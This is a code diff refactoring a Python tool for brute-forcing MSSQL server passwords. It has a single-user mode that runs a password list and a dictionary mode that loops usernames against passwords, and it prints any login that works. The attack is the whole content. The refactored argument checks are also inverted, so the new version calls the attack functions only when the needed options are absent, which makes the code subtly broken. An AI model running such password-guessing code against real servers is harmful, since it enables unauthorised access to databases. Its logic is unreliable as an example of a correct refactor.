@@ -24,46 +24,42 @@ def chekpassword(ms_server, ms_user, ms_password):
     return 1
 
 
-def DictAttck(Host, UsernameFile, PasswordFile):
-    UserHandle = open(UsernameFile)
-    for user in UserHandle:
-        PwdHandle = open(PasswordFile)
-        for pwd in PwdHandle:
-            print
-            Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s" % (user, pwd)
-            if chekpassword(Host, user, pwd) == 1:
-                print
-                Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. Username:%s Password:%s" % (user, pwd)
+def dict_attack(host, username_file, password_file):
+    user_handle = open(username_file)
+    for user in user_handle:
+        password_handle = open(password_file)
+        for pwd in password_handle:
+            print (Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s" % (user, pwd))
+            if chekpassword(host, user, pwd) == 1:
+                print (Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. user_name:%s Password:%s" % (user, pwd))
                 break
 
 
-def FixUserAttack(Host, Username, PasswordFile):
-    PwdHandle = open(PasswordFile)
-    for line in PwdHandle:
-        print
-        Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s" % (Username, line)
-        if chekpassword(Host, Username, line) == 1:
-            print
-            Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. Username:%s Password:%s" % (Username, line)
+def FixUserAttack(host, user_name, password_file):
+    password_handle = open(password_file)
+    for line in password_handle:
+        print(Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s" % (user_name, line))
+        if chekpassword(host, user_name, line) == 1:
+            print(Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. user_name:%s Password:%s" % (user_name, line))
             break
 
 
 def main():
     parser = argparse.ArgumentParser(description='Attack mssql server password by CRoot')
     parser.add_argument('-s', metavar='HostAddr', help='Set host address')
-    parser.add_argument('-l', metavar='Username', help='FixUser to attack')
-    parser.add_argument('-L', metavar='Username File', help='Use username dictionary to attach')
+    parser.add_argument('-l', metavar='user_name', help='FixUser to attack')
+    parser.add_argument('-L', metavar='user_name File', help='Use username dictionary to attach')
     parser.add_argument('-P', metavar='Password File', help='Use password dictionary to attach')
     option = parser.parse_args()
 
-    if option.s == None:
+    if not option.s:
         parser.print_help()
         exit(0)
 
-    if option.l != None and option.P != None:
+    if not option.l and not option.P:
         FixUserAttack(option.s, option.l, option.P)
-    elif option.L != None and option.P != None:
-        DictAttck(option.s, option.L, option.P)
+    elif not option.L and not option.P:
+        dict_attack(option.s, option.L, option.P)
     else:
         parser.print_help()
 
